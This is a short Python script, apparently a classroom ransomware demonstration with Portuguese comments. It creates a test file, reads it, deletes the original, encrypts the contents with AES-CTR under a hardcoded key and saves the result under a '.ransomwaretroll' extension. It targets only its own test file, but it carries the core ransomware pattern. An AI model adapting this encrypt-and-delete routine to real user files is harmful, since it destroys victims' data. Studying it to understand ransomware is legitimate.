import os
import pyaes

file_name = "teste.txt"
chave = b"testeransomwares"

def criptografar_arquivo():
    # Cria o arquivo de teste
    with open(file_name, "w") as f:
        f.write("Conteudo confidencial para teste de criptografia")

    try:
        # Tenta ler o arquivo original
        with open(file_name, "rb") as file:
            file_data = file.read()
    except FileNotFoundError:
        print(f"Erro: O arquivo {file_name} nao foi encontrado.")
        return

    # Remove o arquivo original
    os.remove(file_name)

    # Criptografa
    aes = pyaes.AESModeOfOperationCTR(chave)
    crypto_data = aes.encrypt(file_data)

    # Salva o arquivo criptografado
    new_file = file_name + ".ransomwaretroll"
    with open(new_file, "wb") as new_f:
        new_f.write(crypto_data)

    print(f"[SUCESSO] Arquivo criptografado gerado: {new_file}")

if __name__ == "__main__":
    criptografar_arquivo()
